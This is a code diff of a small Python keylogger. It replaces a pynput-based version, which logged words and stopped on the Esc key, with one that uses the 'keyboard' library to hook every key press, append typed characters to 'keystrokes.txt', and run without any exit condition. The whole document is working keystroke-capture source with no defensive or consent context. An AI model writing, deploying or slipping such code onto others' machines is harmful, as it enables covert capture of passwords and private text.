@@ -1,32 +1,24 @@
-from pynput.keyboard import Key, Listener
+import keyboard
 
 log_file = 'keystrokes.txt'
-current_word = ''
+buffer = []
 
-def save_word(word):
+def on_key_press(event):
+    global buffer
+    key = event.name
+    
+    if key == 'space':
+        buffer.append(' ')
+    elif key == 'enter':
+        buffer.append('\n')
+    elif len(key) == 1:
+        buffer.append(key)
+    else:
+        pass
+
     with open(log_file, 'a') as f:
-        f.write(word + '\n')
+        f.write(''.join(buffer))
+        buffer = []
 
-def on_key_press(key):
-    global current_word
-    try:
-        char = key.char
-        if char == ' ':
-
-            save_word(current_word)
-            current_word = ''
-        else:
-            current_word += char
-    except AttributeError:
-        if key == Key.space or key == Key.enter:
-            save_word(current_word)
-            current_word = ''
-        else:
-            save_word(str(key))
-
-def on_key_release(key):
-    if key == Key.esc:
-        return False
-
-with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
-    listener.join()
+keyboard.on_press(on_key_press)
+keyboard.wait() 
